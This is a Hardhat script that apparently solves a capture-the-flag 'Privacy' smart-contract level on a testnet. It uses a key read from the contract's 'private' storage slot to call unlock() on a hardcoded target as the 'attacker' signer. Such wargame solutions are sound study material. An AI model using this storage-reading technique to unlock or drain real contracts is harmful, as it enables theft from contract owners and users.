import { task } from 'hardhat/config';
import { TaskArguments } from 'hardhat/types';

import { logTransaction } from './utils';

const TARGET = '0x1A26Ea9a263eAc88A905a5a54F651B340810CB10';

// KEY is from the 1st half the last storage slot
// https://dashboard.tenderly.co/tx/rinkeby/0xadb4cc7c63155879ced84635b0bb6ca24c991f96df858104672f09f5d3b27e89/state-diff
const KEY = '0xdd32e537355e4c4eba541ec48bfa7332';

task('deploy:Privacy').setAction(async function (_: TaskArguments, hre) {
  const { ethers } = hre;
  const [attacker] = await ethers.getSigners();

  const privacy = await hre.ethers.getContractAt('Privacy', TARGET);
  if (!privacy || !TARGET || !KEY) {
    throw new Error('missing params');
  }
  const logStatus = async (label = 'Before') => {
    console.log(`[${label}] locked: ${await privacy.locked()}`);
  };

  await logStatus('Before');
  await logTransaction(() => privacy.connect(attacker).unlock(KEY));
  await logStatus('After');
});
